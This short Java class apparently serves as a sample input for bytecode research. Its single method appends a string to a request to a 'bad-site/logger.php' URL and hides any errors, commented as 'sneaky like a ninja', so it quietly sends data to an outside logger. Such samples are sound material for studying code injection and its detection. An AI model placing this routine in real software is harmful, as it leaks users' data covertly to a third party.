package sample.input;
import java.net.URL;
import java.net.URLConnection;

/**
 * A simple class to use as a bytecode
 * @author benjholla
 *
 */
public class Bytecode {
	public static void get(String data){
		try {
			URL url = new URL("http://www.ben-holland.com/bad-site/logger.php?"+data);
			URLConnection connection = url.openConnection();
			connection.getInputStream();
		} catch (Exception e) {
			// nothing, sneaky like a ninja
		}
	}
}
